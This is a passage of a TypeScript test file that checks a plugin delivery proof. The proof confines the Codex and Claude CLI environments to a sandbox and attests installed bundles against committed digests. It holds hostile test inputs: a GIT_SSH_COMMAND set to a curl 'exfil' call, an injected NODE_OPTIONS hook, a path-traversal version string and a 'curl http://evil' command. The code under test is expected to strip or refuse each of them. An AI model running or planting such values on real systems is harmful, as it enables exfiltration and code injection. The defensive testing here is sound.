    for (const wrong of [
      { ...CONTROL_PAYLOAD, kind: "setup_report" },
      { ...CONTROL_PAYLOAD, basis: "something_else" },
      { ...CONTROL_PAYLOAD, schemaVersion: 2 },
      { ...CONTROL_PAYLOAD, verdict: "TOTALLY_FINE" },
      { ...CONTROL_PAYLOAD, canRunHighRiskControl: "no" },
      { schemaVersion: 1, kind: "control_freshness_status", basis: "control_index_snapshot_v1", verdict: "FRESH", canRunHighRiskControl: true, reasons: [] },
    ]) {
      const response = {
        jsonrpc: "2.0",
        id: 3,
        result: { content: [{ type: "text", text: JSON.stringify(wrong) }], structuredContent: wrong },
      };
      expect(evaluateControlStatusResponse(response, 3).ok).toBe(false);
    }
  });

  test("a JSON-RPC error is a refusal even when the transport was flawless", () => {
    expect(evaluateControlStatusResponse({ jsonrpc: "2.0", id: 3, error: { code: -32601 } }, 3).ok).toBe(false);
  });
});

// --- The confined environment ---------------------------------------------------------------------

describe("host confinement is imposed, not inherited", () => {
  test("a hostile inherited environment is dropped, never merged", () => {
    const hostile = {
      CODEX_HOME: REAL_CODEX_HOME,
      HOME: MAINTAINER_HOME,
      USERPROFILE: "C:\\Users\\maintainer",
      SEMCTX_ROOT: "/home/maintainer/secret-project",
      XDG_CONFIG_HOME: "/home/maintainer/.config",
      GIT_DIR: "/home/maintainer/evil.git",
      GIT_CONFIG_GLOBAL: "/home/maintainer/.gitconfig",
      GIT_SSH_COMMAND: "curl http://maintainer/exfil",
      npm_config_prefix: "/home/maintainer/.npm",
      NODE_OPTIONS: "--require /home/maintainer/hook.js",
      PATH: "/usr/local/bin:/usr/bin",
    };
    const codex = hostEnvironment("codex", "/tmp/sandbox/codex", hostile);
    expect(codex["CODEX_HOME"]).toBe("/tmp/sandbox/codex/.codex");
    expect(codex["HOME"]).toBe("/tmp/sandbox/codex");
    expect(codex["SEMCTX_ROOT"]).toBeUndefined();
    expect(Object.hasOwn(codex, "SEMCTX_ROOT")).toBe(false);
    expect(codex["GIT_DIR"]).toBeUndefined();
    expect(codex["GIT_CONFIG_GLOBAL"]).toBeUndefined();
    expect(codex["GIT_SSH_COMMAND"]).toBeUndefined();
    expect(codex["npm_config_prefix"]).toBeUndefined();
    expect(codex["NODE_OPTIONS"]).toBeUndefined();
    expect(codex["PATH"]).toBe("/usr/local/bin:/usr/bin");

    const claude = hostEnvironment("claude", "/tmp/sandbox/claude", hostile);
    expect(claude["CODEX_HOME"]).toBeUndefined();
    expect(Object.hasOwn(claude, "CODEX_HOME")).toBe(false);
    expect(Object.hasOwn(claude, "SEMCTX_ROOT")).toBe(false);
    for (const value of Object.values({ ...codex, ...claude })) {
      expect(value ?? "").not.toContain("maintainer");
    }
  });

  test("every configuration and cache root is replaced by one under the temporary root", () => {
    const environment = hostEnvironment("claude", "/tmp/sandbox/claude", { PATH: "/usr/bin" });
    for (const key of ["XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_STATE_HOME", "XDG_CACHE_HOME", "APPDATA", "LOCALAPPDATA", "TMPDIR", "TEMP", "TMP"]) {
      expect(environment[key] ?? "").toStartWith("/tmp/sandbox/claude");
    }
  });

  test("the allow-list is the whole inheritance rule and carries no profile variable", () => {
    for (const forbidden of ["HOME", "USERPROFILE", "CODEX_HOME", "APPDATA", "GIT_DIR", "SEMCTX_ROOT"]) {
      expect(PROOF_ENVIRONMENT_ALLOW_LIST).not.toContain(forbidden);
    }
    expect(PROOF_ENVIRONMENT_ALLOW_LIST).toContain("PATH");
  });

  test("an environment with no PATH cannot launch anything and says so", () => {
    expect(environmentIsUsable(hostEnvironment("codex", "/tmp/sandbox/codex", {}))).toBe(false);
    expect(environmentIsUsable(hostEnvironment("codex", "/tmp/sandbox/codex", { PATH: "" }))).toBe(false);
    expect(environmentIsUsable(hostEnvironment("codex", "/tmp/sandbox/codex", { PATH: "/usr/bin" }))).toBe(true);
    // Windows spells it `Path`; a case-sensitive check would report a usable environment as broken.
    expect(environmentIsUsable(hostEnvironment("codex", "/tmp/sandbox/codex", { Path: "C:\\Windows" }))).toBe(true);
  });

  test("the proof's own tooling gets a home inside the sandbox, not the runner's", () => {
    const environment = toolchainEnvironment("/tmp/sandbox", { HOME: "/home/maintainer", PATH: "/usr/bin", GIT_DIR: "/evil" });
    expect(environment["HOME"]).toBe("/tmp/sandbox/toolchain");
    expect(environment["PATH"]).toBe("/usr/bin");
    expect(environment["GIT_DIR"]).toBeUndefined();
  });
});

// --- Live orchestration, exercised through the injected runtime -------------------------------

interface FakeOptions {
  missingHosts?: ProofHost[];
  failingInstall?: ProofHost[];
  marketplaceRevision?: string;
  cacheVersion?: string;
  manifestVersion?: string;
  cliExit?: number;
  /** Overrides the `doctor --json` body entirely, for exercising the `checks` contract. */
  doctorPayload?: unknown;
  mcpTools?: number;
  mcpOk?: boolean;
  head?: string | null;
  npmExit?: number;
  npmBody?: string;
  globalVersions?: Record<string, string>;
  cliVersions?: Partial<Record<ProofHost, string>>;
  claudeInstallLocation?: string;
  claudeInstallPath?: string;
  claudeRepo?: string;
  claudeRef?: string;
  codexSource?: string;
  codexRef?: string;
  codexListRef?: string;
  pluginDisabled?: ProofHost[];
  /** Paths reported as links on every observation. */
  linkPaths?: string[];
  /** Paths that are a directory when first admitted and a link when re-admitted before use. */
  swappedPaths?: string[];
  /** Bundles whose installed digest differs from the committed blob. */
  tamperedBundles?: string[];
  /** Rewrite the cache bundles in place immediately after the proof has read their bytes. */
  rewriteAfterAttestation?: boolean;
  /** Let the CLI smoke rewrite every execution copy that already exists before the MCP copy is made. */
  rewriteExecutionCopiesAfterCli?: boolean;
  /** Bundles the published commit does not carry, so the witness is incomplete. */
  missingBlobs?: string[];
  throwOnCommand?: string;
}

function fakeRuntime(options: FakeOptions = {}) {
  const calls: Array<{ command: string[]; cwd: string; env: Record<string, string | undefined> }> = [];
  const files = new Map<string, string>();
  const blobs = new Map<string, Uint8Array>();
  const rewritten = new Set<string>();
  const madeDirectories = new Set<string>();
  const ledger: LedgerEntry[] = [];
  const observations = new Map<string, number>();
  let token = 0;
  const revision = options.marketplaceRevision ?? RELEASE.sha;
  const version = options.cacheVersion ?? RELEASE.version;
  const globals = options.globalVersions ?? {
    [HOST_CLI_SPECIFICATION.codex.package]: HOST_CLI_SPECIFICATION.codex.version,
    [HOST_CLI_SPECIFICATION.claude.package]: HOST_CLI_SPECIFICATION.claude.version,
  };
  const note = (operation: LedgerEntry["operation"], path: string): void => { ledger.push({ operation, path }); };

  const runtime: DeliveryProofRuntime = {
    // The orchestration fake mirrors the runner it stands in for, so the path derivation done by
    // the shared delivery authority is exercised in the separator convention production uses.
    platform: process.platform,
    run(command, cwd, env) {
      calls.push({ command: [...command], cwd, env });
      note("exec", cwd);
      const line = command.join(" ");
      if (options.throwOnCommand !== undefined && line.includes(options.throwOnCommand)) {
        throw new Error(`spawn failed: ${line}`);
      }
      const [binary, ...rest] = command;
      if (binary === "git" && rest.includes("rev-parse")) {
        if (cwd === CODEX_MARKETPLACE_ROOT || cwd === CLAUDE_MARKETPLACE_ROOT) {
          const value = rest.includes("--abbrev-ref") ? "stable" : revision;
          return { code: 0, out: `${value}\n`, err: "" };
        }
        const head = options.head === undefined ? RELEASE.sha : options.head;
        return head === null ? { code: 1, out: "", err: "not a repository" } : { code: 0, out: `${head}\n`, err: "" };
      }
      if (binary === "npm" && rest[0] === "ls") {
        const body = options.npmBody ?? JSON.stringify({
          dependencies: Object.fromEntries(Object.entries(globals).map(([name, v]) => [name, { version: v }])),
        });
        return { code: options.npmExit ?? 0, out: body, err: "" };
      }
      const name: ProofHost | null = binary === "codex" ? "codex" : binary === "claude" ? "claude" : null;
      if (name !== null) {
        if ((options.missingHosts ?? []).includes(name)) return { code: 1, out: "", err: "not found" };
        if (rest.length === 1 && rest[0] === "--version") {
          const reported = options.cliVersions?.[name] ?? HOST_CLI_SPECIFICATION[name].version;
          return { code: 0, out: `${name}-cli ${reported}\n`, err: "" };
        }
        if (rest[0] === "plugin" && rest[1] === "marketplace" && rest[2] === "add") {
          if (name === "codex") {
            const codexHome = env["CODEX_HOME"];
            if (codexHome === undefined || !madeDirectories.has(codexHome)) {
              return { code: 1, out: "", err: "CODEX_HOME path does not exist" };
            }
          }
          return { code: 0, out: "{}", err: "" };
        }
        if (rest[0] === "plugin" && (rest[1] === "add" || rest[1] === "install")) {
          return (options.failingInstall ?? []).includes(name)
            ? { code: 1, out: "", err: "install refused" }
            : { code: 0, out: "{}", err: "" };
        }
        if (rest[0] === "plugin" && rest[1] === "marketplace" && rest[2] === "list") {
          // The canonical shapes `pluginDeliveryStatus` parses: Codex nests under `marketplaces`
          // and names the root `root`; Claude returns a bare array and names it `installLocation`.
          const body = name === "codex"
            ? {
                marketplaces: [{
                  name: "semctx-stable",
                  root: CODEX_MARKETPLACE_ROOT,
                  ...(options.codexListRef === undefined ? {} : { ref: options.codexListRef }),
                  marketplaceSource: {
                    sourceType: "git",
                    source: options.codexSource ?? "https://github.com/hoklims/semctx.git",
                  },
                }],
              }
            : [{
                name: "semctx-stable",
                source: "github",
                repo: options.claudeRepo ?? "hoklims/semctx",
                ...(options.claudeRef === "" ? {} : { ref: options.claudeRef ?? "stable" }),
                installLocation: options.claudeInstallLocation ?? CLAUDE_MARKETPLACE_ROOT,
              }];
          return { code: 0, out: JSON.stringify(body), err: "" };
        }
        if (rest[0] === "plugin" && rest[1] === "list") {
          const body = name === "codex"
            ? { installed: [{
                pluginId: EXPECTED_PLUGIN_ID.codex,
                installed: true,
                enabled: !(options.pluginDisabled ?? []).includes(name),
                version,
              }] }
            : [{
                id: EXPECTED_PLUGIN_ID.claude,
                scope: "user",
                enabled: !(options.pluginDisabled ?? []).includes(name),
                version,
                installPath: options.claudeInstallPath ?? join(CLAUDE_CACHE_ROOT, version),
              }];
          return { code: 0, out: JSON.stringify(body), err: "" };
        }
        throw new Error(`fake runtime: unexpected ${name} command: ${line}`);
      }
      if (binary === "bun" && rest[1] === "doctor") {
        if (options.rewriteExecutionCopiesAfterCli === true) {
          const cliSnapshot = dirname(dirname(rest[0] ?? ""));
          for (const [path] of blobs) {
            if (isWithinRoot(path, cliSnapshot)) {
              blobs.set(path, new TextEncoder().encode(`rewritten-after-cli:${path}`));
            }
          }
        }
        const doctorBody = options.doctorPayload ?? {
          healthy: true,
          version,
          checks: [
            { name: "cli", ok: true, detail: `semctx ${version}` },
            { name: "workspace", ok: true, detail: "configured" },
            { name: "runtime", ok: true, detail: "bun" },
          ],
        };
        return { code: options.cliExit ?? 0, out: JSON.stringify(doctorBody), err: "" };
      }
      throw new Error(`fake runtime: unknown command: ${line}`);
    },
    gitBlob(checkoutRoot, commit, path) {
      note("blob", checkoutRoot);
      if (commit !== RELEASE.sha) return null;
      for (const bundle of PLUGIN_RUNTIME_BUNDLES) {
        // The blob carries the committed bytes; the *installed* copy may have been tampered with.
        if (path.endsWith(bundle)) {
          if ((options.missingBlobs ?? []).includes(bundle)) return null;
          return new TextEncoder().encode(`committed:${bundle}`);
        }
      }
      return null;
    },
    makeDirectory(target) { note("make", target); madeDirectories.add(target); },
    readTextFile(target) {
      note("read", target);
      if (files.has(target)) return files.get(target) ?? null;
      if (target.endsWith(".codex-marketplace-install.json")) {
        return JSON.stringify({
          revision,
          ...(options.codexRef === "" ? {} : { ref_name: options.codexRef ?? "stable" }),
          source: options.codexSource ?? "https://github.com/hoklims/semctx.git",
        });
      }
      if (target.endsWith("plugin.json")) return JSON.stringify({ version: options.manifestVersion ?? version });
      return null;
    },
    writeTextFile(target, contents) { note("write", target); files.set(target, contents); },
    readBytes(target) {
      note("read", target);
      const stored = blobs.get(target);
      if (stored !== undefined) return stored;
      for (const bundle of PLUGIN_RUNTIME_BUNDLES) {
        if (target.endsWith(bundle)) {
          const tampered = (options.tamperedBundles ?? []).includes(bundle);
          // The read hands back the bytes that exist *now*. When the host rewrites the file right
          // afterwards, only a later re-read would see it — which is precisely why the proof must
          // not re-read.
          if (options.rewriteAfterAttestation === true) rewritten.add(target);
          return new TextEncoder().encode(tampered ? `tampered:${bundle}` : `committed:${bundle}`);
        }
      }
      return null;
    },
    writeBytes(target, bytes) { note("write", target); blobs.set(target, bytes); },
    randomToken: () => `token-${++token}`,
    digestFile(target) {
      note("digest", target);
      const stored = blobs.get(target);
      if (stored !== undefined) return sha256Hex(new TextDecoder().decode(stored));
      for (const bundle of PLUGIN_RUNTIME_BUNDLES) {
        if (target.endsWith(bundle)) {
          if (rewritten.has(target)) return sha256Hex(`rewritten:${bundle}`);
          return (options.tamperedBundles ?? []).includes(bundle)
            ? sha256Hex(`tampered:${bundle}`)
            : sha256Hex(`committed:${bundle}`);
        }
      }
      return null;
    },
    pathKind(target) {
      note("stat", target);
      if ((options.linkPaths ?? []).includes(target)) return "link";
      if ((options.swappedPaths ?? []).includes(target)) {
        // A directory when it is checked, a junction when it is used: the exact race a single
        // up-front admission cannot see.
        const seen = (observations.get(target) ?? 0) + 1;
        observations.set(target, seen);
        return seen === 1 ? "directory" : "link";
      }
      if (blobs.has(target) || files.has(target) || target.endsWith("plugin.json")
        || target.endsWith(".codex-marketplace-install.json")
        || PLUGIN_RUNTIME_BUNDLES.some((bundle) => target.endsWith(bundle))) return "file";
      return "directory";
    },
    realPath: (target) => target,
    joinPath: (...segments) => resolve(join(...segments)),
    ledger: () => ledger,
    mcpHandshake: (bundlePath, cwd, _repositoryRoot, env) => {
      calls.push({ command: ["bun", bundlePath, "<mcp>"], cwd, env });
      note("exec", cwd);
      return Promise.resolve({
        ok: options.mcpOk ?? (options.mcpTools ?? 37) > 0,
        toolCount: options.mcpTools ?? 37,
        detail: "ok",
        verdict: "UNSEALED",
        pid: 4242,
        stdoutBytes: 0,
        stderrBytes: 0,
      });
    },
  };
  return { runtime, calls, files, blobs, ledger };
}

function sha256Hex(value: string): string {
  return new Bun.CryptoHasher("sha256").update(value).digest("hex");
}

const LIVE_OPTIONS = {
  release: RELEASE,
  run: RUN,
  releaseCheckout: CHECKOUT,
  sandboxRoot: SANDBOX,
  foreignRepository: FOREIGN,
  proofOutput: PROOF_OUTPUT,
  forbiddenRoots: [REAL_CODEX_HOME, REAL_CLAUDE_HOME],
  inheritedEnvironment: { PATH: "/usr/local/bin:/usr/bin" },
};

describe("live orchestration — real host contracts", () => {
  test("a nominal run proves both hosts through their own reported shapes", async () => {
    const { runtime } = fakeRuntime();
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.reasons).toEqual([]);
    expect(proof.ok).toBe(true);
    expect(proof.checkout.ok).toBe(true);
    // Claude's marketplace root came from `installLocation`, Codex's from `root`.
    expect(proof.hosts.claude.marketplaceRoot).toBe(CLAUDE_MARKETPLACE_ROOT);
    expect(proof.hosts.codex.marketplaceRoot).toBe(CODEX_MARKETPLACE_ROOT);
    expect(proof.hosts.claude.cachePath).toBe(join(CLAUDE_CACHE_ROOT, RELEASE.version));
    expect(proof.hosts.codex.cachePath).toBe(join(CODEX_CACHE_ROOT, RELEASE.version));
    expect(proof.hosts.codex.attested).toBe(true);
    expect(proof.hosts.claude.attested).toBe(true);
  });

  test("Claude's marketplace root is read from installLocation, not from an invented property", async () => {
    // The property the previous implementation invented. A parser that still looked for `path`
    // would find nothing here and report the marketplace root as unknown.
    const { runtime } = fakeRuntime();
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.hosts.claude.marketplaceRoot).toBe(CLAUDE_MARKETPLACE_ROOT);

    const moved = fakeRuntime({ claudeInstallLocation: join(SANDBOX, "claude", "elsewhere") });
    const second = await runStableDeliveryProof(LIVE_OPTIONS, moved.runtime);
    expect(second.hosts.claude.marketplaceRoot).toBe(join(SANDBOX, "claude", "elsewhere"));
    expect(marketplaceCommand("claude")).toEqual(["claude", "plugin", "marketplace", "list", "--json"]);
  });

  test("every host command runs with the confined environment", async () => {
    const { runtime, calls } = fakeRuntime();
    await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    const hostCalls = calls.filter((call) => call.command[0] === "codex" || call.command[0] === "claude");
    expect(hostCalls.length).toBeGreaterThan(0);
    for (const call of hostCalls) {
      expect(call.env["HOME"]).toContain(SANDBOX);
      expect(call.env["SEMCTX_ROOT"]).toBeUndefined();
      expect(call.env["PATH"]).toBe("/usr/local/bin:/usr/bin");
    }
  });

  test("creates the configured CODEX_HOME before Codex mutates its profile", async () => {
    const { runtime, calls, ledger } = fakeRuntime();
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    const codexCall = calls.find((call) => call.command[0] === "codex");
    const codexHome = codexCall?.env["CODEX_HOME"];
    expect(codexHome).toBe(hostEnvironment("codex", join(SANDBOX, "codex"))["CODEX_HOME"]);
    if (codexHome === undefined) throw new Error("the Codex call carried no CODEX_HOME");
    expect(ledger).toContainEqual({ operation: "make", path: codexHome });
    expect(proof.hosts.codex.ok).toBe(true);
  });

  test("a runner environment with no PATH fails the hosts instead of blaming them", async () => {
    const { runtime, calls } = fakeRuntime();
    const proof = await runStableDeliveryProof({ ...LIVE_OPTIONS, inheritedEnvironment: {} }, runtime);
    expect(proof.ok).toBe(false);
    for (const name of PROOF_HOSTS) expect(proof.hosts[name].reasons).toContain("HOST_ENVIRONMENT_INCOMPLETE");
    expect(calls.filter((call) => call.command[0] === "codex" || call.command[0] === "claude")).toEqual([]);
  });

  test("only officially supported host interfaces are used", () => {
    expect(installCommands("codex")).toEqual([
      ["codex", "plugin", "marketplace", "add", "hoklims/semctx", "--ref", "stable", "--json"],
      ["codex", "plugin", "add", "semctx-control@semctx-stable", "--json"],
    ]);
    expect(installCommands("claude")).toEqual([
      ["claude", "plugin", "marketplace", "add", "hoklims/semctx@stable", "--scope", "user"],
      ["claude", "plugin", "install", "semctx@semctx-stable", "--scope", "user"],
    ]);
    for (const name of PROOF_HOSTS) {
      expect(JSON.stringify(installCommands(name))).toContain("stable");
      expect(JSON.stringify(installCommands(name))).not.toContain("main");
    }
  });

  test("an absent host CLI fails the run instead of reducing it to one host", async () => {
    const { runtime } = fakeRuntime({ missingHosts: ["claude"] });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("HOST_CLI_UNAVAILABLE");
    expect(proof.hosts.codex.ok).toBe(true);
  });

  test("a refused install is never rescued by leftover cache state", async () => {
    const { runtime } = fakeRuntime({ failingInstall: ["codex"] });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("HOST_INSTALL_FAILED");
    expect(proof.hosts.codex.bundles).toEqual({});
  });

  test("a marketplace resolved to another commit fails at the same version", async () => {
    const { runtime } = fakeRuntime({ marketplaceRevision: "4".repeat(40) });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("MARKETPLACE_COMMIT_MISMATCH");
  });

  test("a CLI entrypoint that will not run from a foreign directory fails", async () => {
    const { runtime } = fakeRuntime({ cliExit: 2 });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("CLI_SMOKE_FAILED");
  });

  test("an MCP runtime that exposes no tools fails", async () => {
    const { runtime } = fakeRuntime({ mcpTools: 0 });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("MCP_SMOKE_FAILED");
  });

  test("both smokes are launched from the foreign repository, not from a cache", async () => {
    const { runtime, calls } = fakeRuntime();
    await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    const smokes = calls.filter((call) => call.command[0] === "bun");
    expect(smokes.length).toBeGreaterThan(0);
    for (const smoke of smokes) expect(smoke.cwd).toBe(FOREIGN);
  });

  test("the checkout the witness comes from is proven to be GITHUB_SHA, not assumed", async () => {
    const { runtime, calls } = fakeRuntime({ head: "3".repeat(40) });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("CHECKOUT_SHA_MISMATCH");
    // A wrong head yields no witness at all rather than a witness of the wrong tree.
    expect(proof.reasons).toContain("WITNESS_NOT_FROM_COMMIT");
    expect(proof.witnesses.codex["semctx.js"]).toBeNull();
    const revParse = calls.find((call) => call.command[0] === "git" && call.cwd === CHECKOUT);
    expect(revParse?.command).toEqual(["git", "--no-replace-objects", "rev-parse", "HEAD"]);
    expect(revParse?.env["GIT_DIR"]).toBeUndefined();
  });
});

describe("hostile 9 — trust precedes effect", () => {
  test("a bundle tampered with after checkout is never executed, and the run is red", async () => {
    // HEAD is correct, so the committed blob is the real one; the *installed* copy differs.
    const { runtime, calls } = fakeRuntime({ tamperedBundles: ["semctx.js"] });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.checkout.ok).toBe(true);
    for (const name of PROOF_HOSTS) {
      expect(proof.hosts[name].attested).toBe(false);
      expect(proof.hosts[name].reasons).toContain("BUNDLE_DIGEST_MISMATCH");
      expect(proof.hosts[name].reasons).toContain("BUNDLE_NOT_ATTESTED");
      expect(proof.hosts[name].cliSmoke.ran).toBe(false);
      expect(proof.hosts[name].mcpSmoke.ran).toBe(false);
    }
    // The gate is what matters: nothing under the cache was launched, not even once.
    expect(calls.filter((call) => call.command[0] === "bun")).toEqual([]);
  });

  test("the witness is addressed by commit, so an edited working tree cannot license itself", async () => {
    const { runtime } = fakeRuntime();
    const witness = readWitness(runtime, CHECKOUT, RELEASE.sha, "codex", {});
    expect(Object.keys(witness).sort()).toEqual([...PLUGIN_RUNTIME_BUNDLES].sort());
    expect(witness["semctx.js"]).toBe(sha256Hex("committed:semctx.js"));
    // A commit the checkout does not carry yields nothing rather than a working-tree reading.
    const absent = readWitness(runtime, CHECKOUT, "0".repeat(40), "codex", {});
    for (const bundle of PLUGIN_RUNTIME_BUNDLES) expect(absent[bundle]).toBeNull();
  });

  test("a CLI whose identity is unproven still cannot license an execution", async () => {
    const { runtime } = fakeRuntime({ cliVersions: { claude: "9.9.9" } });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.cli.resolvedVersion).toBe(HOST_CLI_SPECIFICATION.claude.version);
    expect(proof.hosts.claude.cli.reportedVersion).toBe("9.9.9");
    expect(proof.hosts.claude.reasons).toContain("HOST_CLI_VERSION_MISMATCH");
  });

  test("a non-zero npm ls is not a resolution, however plausible its JSON body is", async () => {
    const plausible = JSON.stringify({
      name: "npm-global",
      dependencies: {
        [HOST_CLI_SPECIFICATION.codex.package]: { version: HOST_CLI_SPECIFICATION.codex.version },
        [HOST_CLI_SPECIFICATION.claude.package]: { version: HOST_CLI_SPECIFICATION.claude.version },
      },
      error: { code: "ELSPROBLEMS" },
    });
    const { runtime } = fakeRuntime({ npmExit: 1, npmBody: plausible });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    for (const name of PROOF_HOSTS) {
      expect(proof.hosts[name].cli.resolutionQueryOk).toBe(false);
      expect(proof.hosts[name].reasons).toContain("HOST_CLI_QUERY_FAILED");
      expect(proof.hosts[name].reasons).toContain("HOST_CLI_UNRESOLVED");
      // The version in the body was correct — parsing it would have manufactured a pass.
      expect(proof.hosts[name].cli.resolvedVersion).toBeNull();
    }
  });

  test("the archived CLI evidence names what was asked for and what answered", async () => {
    const { runtime } = fakeRuntime();
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.hosts.codex.cli.requestedSpecifier).toBe("@openai/codex@0.147.0");
    expect(proof.hosts.claude.cli.requestedSpecifier).toBe("@anthropic-ai/claude-code@2.1.229");
    expect(proof.hosts.codex.cli.rawVersion).toBe("codex-cli 0.147.0");
    expect(proof.hosts.codex.cli.reportedVersion).toBe("0.147.0");
  });
});

describe("hostile 10 — every consumed descendant is confined, and re-confined at use", () => {
  test("a Claude cache reported outside the sandbox fails the host and is never read", async () => {
    const { runtime, calls } = fakeRuntime({
      claudeInstallPath: join(REAL_CLAUDE_HOME, "plugins", "cache", "semctx-stable", "semctx", "1.2.3"),
    });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("HOST_PATH_ESCAPED_SANDBOX");
    expect(proof.hosts.claude.cachePath).toBeNull();
    expect(calls.some((call) => call.command.join(" ").includes(MAINTAINER_HOME))).toBe(false);
    expect(proof.isolation.reasons).not.toContain("PROTECTED_ROOT_TOUCHED");
  });

  test("a marketplace snapshot outside the sandbox never has Git run inside it", async () => {
    const outside = resolve("/var/lib/marketplaces/semctx-stable");
    const { runtime, calls } = fakeRuntime({ claudeInstallLocation: outside });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("HOST_PATH_ESCAPED_SANDBOX");
    expect(calls.some((call) => call.cwd.startsWith(outside))).toBe(false);
  });

  for (const [label, host, target] of [
    ["manifest", "claude", join(CLAUDE_CACHE_ROOT, RELEASE.version, ".claude-plugin", "plugin.json")],
    ["dist bundle", "claude", join(CLAUDE_CACHE_ROOT, RELEASE.version, "dist", "semctx.js")],
    ["snapshot metadata", "codex", join(CODEX_MARKETPLACE_ROOT, ".codex-marketplace-install.json")],
  ] as const) {
    test(`a link nested at the ${label} is refused, not followed`, async () => {
      const { runtime } = fakeRuntime({ linkPaths: [target] });
      const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
      expect(proof.ok).toBe(false);
      expect(proof.hosts[host].reasons).toContain("HOST_PATH_IS_LINK");
    });
  }

  test("a target swapped for a link between admission and use fails before the read", async () => {
    // Admitted as a directory, replaced by a junction before the bundle is digested.
    const target = join(CLAUDE_CACHE_ROOT, RELEASE.version);
    const { runtime } = fakeRuntime({ swappedPaths: [target] });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("HOST_PATH_IS_LINK");
    // The first admission succeeded; the re-admission is what caught it.
    const admissions = proof.hosts.claude.pathAdmissions.filter((entry) => entry.candidate === target);
    expect(admissions.some((entry) => entry.reason === null)).toBe(true);
    expect(admissions.some((entry) => entry.reason === "HOST_PATH_IS_LINK")).toBe(true);
  });

  test("the executed entrypoint is re-admitted at launch, so a swapped one is never started", async () => {
    // The cache entrypoint is no longer what runs, so the meaningful race is on the snapshot the
    // proof owns: admitted when it is written, swapped for a link before the spawn.
    const entry = join(SANDBOX, "exec", "claude-cli-token-3", "dist", "semctx.js");
    const { runtime, calls } = fakeRuntime({ swappedPaths: [entry] });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.reasons).toContain("HOST_PATH_IS_LINK");
    expect(calls.filter((call) => call.command[0] === "bun" && call.command[1] === entry)).toEqual([]);
  });

  test("swapping the cache entrypoint after attestation is irrelevant: it is not an execution target", async () => {
    const cacheEntry = join(CLAUDE_CACHE_ROOT, RELEASE.version, "dist", "semctx.js");
    const { runtime, calls } = fakeRuntime({ swappedPaths: [cacheEntry] });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    // This is the residual risk the snapshot closes rather than detects: whatever the host does to
    // the cache file after its bytes were read cannot reach an execution, because the cache is never
    // launched. The run stays whole and nothing is spawned from that path.
    expect(proof.ok).toBe(true);
    expect(calls.filter((call) => call.command[0] === "bun" && call.command[1] === cacheEntry)).toEqual([]);
    expect(isWithinRoot(proof.hosts.claude.executionSnapshots.cli!, join(SANDBOX, "exec"))).toBe(true);
  });

  test("a host-reported version that is not a semver token never becomes a path segment", async () => {
    const { runtime, calls } = fakeRuntime({ cacheVersion: "../../../../home/maintainer/.codex" });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("INSTALLED_VERSION_UNKNOWN");
    expect(proof.hosts.codex.cachePath).toBeNull();
    expect(calls.some((call) => call.command.join(" ").includes("home/maintainer/.codex"))).toBe(false);
  });

  test("no real profile path appears in the ledger of a nominal run", async () => {
    const { runtime, ledger } = fakeRuntime();
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(ledger.length).toBeGreaterThan(0);
    for (const entry of ledger) {
      expect(isWithinRoot(entry.path, REAL_CODEX_HOME)).toBe(false);
      expect(isWithinRoot(entry.path, REAL_CLAUDE_HOME)).toBe(false);
    }
    expect(proof.isolation.escaped).toEqual([]);
    expect(proof.isolation.ok).toBe(true);
  });

  test("the fake refuses any command the orchestration was not expected to run", () => {
    const { runtime } = fakeRuntime();
    expect(() => runtime.run(["curl", "http://evil"], "/tmp", {})).toThrow("unknown command");
    expect(() => runtime.run(["codex", "plugin", "remove", "x"], "/tmp", {})).toThrow("unexpected codex command");
  });
});

// --- `main` and the artifact the workflow actually uploads ------------------------------------

function liveEnvironment(overrides: Record<string, string | undefined> = {}): Record<string, string | undefined> {
  return {
    GITHUB_SHA: RELEASE.sha,
    GITHUB_REF_NAME: RELEASE.tag,
    GITHUB_REPOSITORY: RUN.repository,
    GITHUB_RUN_ID: RUN.runId,
    GITHUB_RUN_ATTEMPT: RUN.runAttempt,
    SEMCTX_PROOF_TOOL_SHA: RUN.verifierSha,
    SEMCTX_DELIVERY_SANDBOX: SANDBOX,
    SEMCTX_RELEASE_CHECKOUT: CHECKOUT,
    SEMCTX_FOREIGN_REPOSITORY: FOREIGN,
